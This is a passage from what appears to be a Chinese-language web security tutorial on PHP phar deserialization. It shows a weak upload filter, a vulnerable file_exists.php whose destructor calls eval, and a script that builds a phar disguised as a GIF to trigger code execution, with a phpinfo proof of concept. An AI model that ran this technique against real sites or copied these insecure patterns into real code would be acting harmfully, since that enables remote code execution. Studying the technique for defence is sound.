        <span class="nv">$path</span><span class="o">=</span><span class="nx">PATH</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="s2">"upload"</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="s2">"images"</span><span class="p">;</span>
        <span class="nv">$filetype</span><span class="o">=</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"pic"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span><span class="s2">"."</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"pic"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span><span class="nv">$path</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"pic"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
            <span class="k">echo</span> <span class="s2">"上传成功！"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>file_exists.php<br/>
验证文件是否存在，漏洞利用点:<code>file_exists()</code>函数</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$filename</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
<span class="k">class</span> <span class="nc">ghtwf01</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">'echo exists;'</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>构造phar文件</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">ghtwf01</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">'phpinfo();'</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'phar.phar'</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">setStub</span><span class="p">(</span><span class="s1">'GIF89a'</span><span class="o">.</span><span class="s1">'&lt;?php __HALT_COMPILER();?&gt;'</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">addFromString</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span><span class="s1">'test'</span><span class="p">);</span>
<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ghtwf01</span><span class="p">();</span>
<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">setMetadata</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>改后缀名为<code>gif</code>，然后上传，最后在<code>file_exists.php</code>利用漏洞</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png"/></p>
<h1 data-content="1" id="8198966fdad7c4912f7c127f8c1d23b2">参考链接</h1>
<p><a href="https://www.freebuf.com/articles/web/206249.html" target="_blank">https://www.freebuf.com/articles/web/206249.html</a><br/>
<a href="http://mini.eastday.com/mobile/190306223633207.html#" target="_blank">http://mini.eastday.com/mobile/190306223633207.html#</a><br/>
<a href="https://www.jianshu.com/p/54e93e92ba9e" target="_blank">https://www.jianshu.com/p/54e93e92ba9e</a><br/>
<a href="https://www.jb51.net/article/79144.htm" target="_blank">https://www.jb51.net/article/79144.htm</a><br/>
<a href="https://xz.aliyun.com/t/6640" target="_blank">https://xz.aliyun.com/t/6640</a><br/>
<a href="https://www.freebuf.com/vuls/202819.html" target="_blank">https://www.freebuf.com/vuls/202819.html</a><br/>
<a href="https://blog.csdn.net/u011474028/article/details/54973571" target="_blank">https://blog.csdn.net/u011474028/article/details/54973571</a><br/>
<a href="https://xz.aliyun.com/t/2715" target="_blank">https://xz.aliyun.com/t/2715</a><br/>
<a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank">https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
</div>
</div>